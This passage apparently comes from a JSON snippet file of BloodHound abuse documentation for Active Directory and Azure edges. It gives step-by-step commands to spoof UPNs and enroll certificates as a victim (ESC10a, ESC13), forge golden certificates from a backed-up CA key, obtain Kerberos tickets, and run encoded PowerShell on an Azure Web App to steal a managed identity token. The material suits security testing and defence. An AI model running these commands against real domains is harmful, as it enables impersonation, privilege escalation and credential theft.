            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 4.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 4.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 4: Obtain a session as victim.  There are several options for this step.",
            "You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "Step 5: Enroll certificate as victim.",
            "Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
            "```",
            "The issued certificate will be saved to disk with the name of the targeted user.",
            "Step 6 (Optional): Set `dNSHostName` and SPN of victim to the previous value.",
            "To avoid issues in the environment, set the `dNSHostName` and SPN of the victim computer back to it's previous value using Certipy and ldapmodify:",
            "```bash",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL",
            "```",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 7: Perform Schannel authentication as targeted principal against affected DC using certificate.",
            "Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 5 and the IP of an affected DC:",
            "```bash",
            "certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
            "```"
        ]
    },
    "AZHasRole": {
        "prefix": "AZHasRole",
        "description": "his edge indicates that a principal has been granted a particular AzureAD admin role",
        "body": [
            "No abuse is necessary. This edge only indicates that the principal has been granted a particular AzureAD admin role."
        ]
    },
    "ADCSESC13": {
        "prefix": "ADCSESC13",
        "description": "The ADCSESC13 edge indicates that the principal has the privileges to perform the ADCS ESC13 abuse against the target AD group. The principal has enrollment rights on a certificate template configured with an issuance policy extension.",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "### Step 1: Request enrollment in the affected template",
            "On Windows, use Certify to request enrollment in the affected template, specifying the affected certification authority:",
            "```bash",
            "Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC13\"",
            "```",
            "On Linux, use Certipy to request enrollment in the affected template, specifying the affected enterprise CA:",
            "```bash",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "### Step 2: Create PFX format of certificate (Windows only)",
            "Save the certificate as cert.pem and the private key as cert.key.",
            "Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "### Step 3: Request a ticket granting ticket (TGT)",
            "On Windows, use Rubeus to request a TGT from the domain, specifying the attacker identity, the PFX-formatted certificate created in Step 2, and the certificate password:",
            "```bash",
            "Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt",
            "```",
            "On Linux, use Certipy to request a TGT from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```bash",
            "certipy auth -pfx john.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC10a": {
        "prefix": "ADCSESC10a",
        "description": "This edge indicates that the principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to enable certificate authentication and require the userPrincipalName (UPN) of the enrollee included in the Subject Alternative Name (SAN).",
        "body": [
            "### Windows",
            "Step 1: Create .exe version of Certipy.",
            "Install PyInstaller on a host with python installed, clone down Certipy from GitHub, and run this cmdlet from the root of the GitHub repo to bundle the python project into an .exe binary which can be used on Windows computer where Python is not installed:",
            "```bash",
            "pyinstaller ./Certipy.spec",
            "```",
            "The Certipy.exe will be in the _dist_ folder.",
            "Step 2: Set UPN of victim to targeted principal's sAMAccountName followed by @ and",
            "the domain name.",
            "Set the UPN of the victim principal using Certipy:",
            "```bash",
            "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL",
            "```",
            "Step 3: Check if the 'mail' attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 4.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using PowerView:",
            "```bash",
            "Get-DomainObject -Identity VICTIM -Properties mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 4.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:",
            "```bash",
            "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
            "```",
            "Step 4: Obtain a session as victim. There are several options for this step.",
            "If the victim is a computer, you can obtain the credentials of the computer account using the Shadow",
            "Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "If the victim is a user, you have the following options for obtaining the credentials:",
            "* Shadow Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "* Password reset (see [ForceChangePassword edge](/resources/edges/force-change-password) documentation).",
            "* Targeted Kerberoasting (see [WriteSPN edge](/resources/edges/write-spn) documentation).",
            "Step 5: Enroll certificate as victim. Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "Certipy.exe req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
            "```",
            "The issued certificate will be saved to disk with the name of the targeted user.",
            "Step 6: Set UPN of victim to an arbitrary value.",
            "Set the UPN of the victim principal using Certipy:",
            "```bash",
            "Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local",
            "```",
            "Step 7: Perform Schannel authentication as targeted principal against affected DC using",
            "certificate. Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 5 and the IP of an affected DC:",
            "```bash",
            "Certipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
            "```",
            "### Linux",
            "Step 1: Set UPN of victim to targeted principal's sAMAccountName followed by @ and",
            "the domain name.",
            "Set the UPN of the victim principal using Certipy:",
            "```bash",
            "certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL",
            "```",
            "Step 2: Check if the 'mail' attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 3.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 3.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 3: Obtain the credentials of victim. There are several options for this step.",
            "If the victim is a computer, you can obtain the credentials of the computer account using the Shadow",
            "Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "If the victim is a user, you have the following options for obtaining the credentials:",
            "* Shadow Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "* Password reset (see [ForceChangePassword edge](/resources/edges/force-change-password) documentation).",
            "* Targeted Kerberoasting (see [WriteSPN edge](/resources/edges/write-spn) documentation).",
            "Step 4: Enroll certificate as victim. Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
            "```",
            "The issued certificate will be saved to disk with the name of the targeted user.",
            "Step 5: Set UPN of victim to an arbitrary value.",
            "Set the UPN of the victim principal using Certipy:",
            "```bash",
            "certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local",
            "```",
            "Step 6: Perform Schannel authentication as targeted principal against affected DC using",
            "certificate. Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 5 and the IP of an affected DC:",
            "```bash",
            "certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
            "```"
        ]
    },
    "AZWebsiteContributor": {
        "prefix": "AZWebsiteContributor",
        "description": "The Website Contributor role grants full control of the target Function App or Web App. Full control of either of those types of resources allows for arbitrary command execution against the target resoruce.",
        "body": [
            "You can use BARK’s Invoke-AzureRMWebAppShellCommand function to execute commands on a target Web App. You can use BARK’s New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, and Get-AzureFunctionOutput functions to execute arbitrary commands against a target Function App.",
            "These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the web app or function app. There are several ways to acquire a JWT. For example, you may use BARK’s Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:",
            "```bash",
            "$ARMToken = Get-ARMTokenWithRefreshToken `",
            "    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `",
            "    -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use BARK’s Invoke-AzureRMWebAppShellCommand function to execute a command against the target Web App. For example, to run a simple “whoami” command:",
            "```bash",
            "Invoke-AzureRMWebAppShellCommand `",
            "    -KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `",
            "    -Token $ARMToken `",
            "    -Command \"whoami\"",
            "```",
            "If the Web App has a managed identity assignments, you can use BARK’s Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the managed identity Service Principal like this:",
            "```bash",
            "PS C:\\> $PowerShellCommand =",
            "        $headers=@{\"X-IDENTITY-HEADER\"=$env:IDENTITY_HEADER}",
            "        $response = Invoke-WebRequest -UseBasicParsing -Uri \"$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01\" -Headers $headers",
            "        $response.RawContent",
            "PS C:\\> $base64Cmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PowerShellCommand))",
            "PS C:\\> $Command = \"powershell -enc $($base64Cmd)\"",
            "PS C:\\> Invoke-AzureRMWebAppShellCommand `",
            "        -KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `",
            "        -token $ARMToken `",
            "        -Command $Command",
            "```",
            "If successful, the output will include a JWT for the managed identity service principal."
        ]
    },
    "AZOwner": {
        "prefix": "AZOwner",
        "description": "The principal is granted the Owner role on the resource.",
        "body": [
            "Everything a Contributor can do, with the addition of assigning rights to resources. Object ownership means almost all abuses are possible against the target object."
        ]
    },
    "GoldenCert": {
        "prefix": "GoldenCert",
        "description": "he victim principal has a certificate private key that can be abused to sign \"golden\" certificates for authentication of any enabled principal in the AD forest of the domain",
        "body": [
            "### Windows",
            "#### Step 1",
            "Obtain CA certificate incl. private key - using built-in GUI (certsrv.msc)",
            "1.  Open certsrv.msc as Administrator on the enterprise CA host.",
            "2.  Right-click on the enterprise CA and select \"All Tasks\" followed by \"Back up CA...\".",
            "3.  Click \"Next\", select \"Private key and CA certificate\", and select the location folder.",
            "4.  Click \"Next\", and set a password.",
            "5.  Click \"Next\" and click \"Finish\" to back up the certificate as a .p12 file.",
            "#### Step 2",
            "Obtain CA certificate incl. private key - using commandline tools",
            "* Print all certificates of the host using SharpDPAPI.  The enterprise CA certificate is the one where issuer and subject are identical.",
            "```",
            "SharpDPAPI.exe certificates /machine",
            "```",
            "* Save the private key in .key file (e.g. cert.key) and the certificate in .pem file (cert.pem) in the same folder.",
            "* Create a .pfx version of the CA certificate using certutil:",
            "```",
            "certutil.exe -MergePFX .\\\\cert.pem .\\\\cert.pfx",
            "```",
            "* Set password when prompted.",
            "#### Step 3",
            "Forge certificate and obtain a TGT as targeted principal.",
            "* Forge a certificate of a target principal using ForgeCert:",
            "```",
            "ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword \"password123!\" --Subject \"CN=User\" --SubjectAltName \"roshi@dumpster.fire\" --NewCertPath target.pfx --NewCertPassword \"NewPassword123!\"",
            "```",
            "* Request a TGT for the targeted principal using the certificate with Rubeus:",
            "```",
            "Rubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!",
            "```",
            "### Linux",
            "#### Step 1",
            "* Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy.  The enterprise CA certificate is the one where issuer and subject are identical.",
            "```",
            "certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!",
            "```",
            "#### Step 2",
            "Forge a certificate of a target principal:",
            "```",
            "certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire",
            "```",
            "#### Step 3",
            "Request a TGT for the targeted principal using the certificate against a given DC:",
            "```",
            " certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10",
            "```"
        ]
    },
    "DelegatedEnrollmentAgent": {
        "prefix": "DelegatedEnrollmentAgent",
        "description": "The certificate template is published to an enterprise CA where the enrollment agent restrictions are configured to allow this principal to enroll certificates against this template as an enrollment agent.",
        "body": [
            "An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "AZMGAddMember": {
        "prefix": "AZMGAddMember",
        "description": "This edge is created during post-processing.",
        "body": [
            "You can abuse this privilege using BARK’s Add-AZMemberToGroup function.",
            "This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add principal to the target group. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```bash",
            "$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "    -ClientSecret \"asdf...\" `",
            "    -TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK’s Add-AZMemberToGroup function to add a new principial to the target group:",
            "```bash",
            "Add-AZMemberToGroup `",
            "    -PrincipalID = \"028362ca-90ae-41f2-ae9f-1a678cc17391\" `",
            "    -TargetGroupId \"b9801b7a-fcec-44e2-a21b-86cb7ec718e4\" `",
            "    -Token $MGToken.access_token",
            "```",
            "Then, you can re-authenticate as the principal you just added to the group and continue your attack path, now having whatever privileges the target group has."
        ]
    },
    "GetChangesAll": {
        "prefix": "GetChangesAll",
        "description": "he principal is granted the GetChangesAll right on the domain",
        "body": [
            "This edge is not abuseable by itself. When combined with [GetChanges](/resources/edges/get-changes), BloodHound will create the abuseable edge [DCSync](/resources/edges/dc-sync)."
        ]
    }
}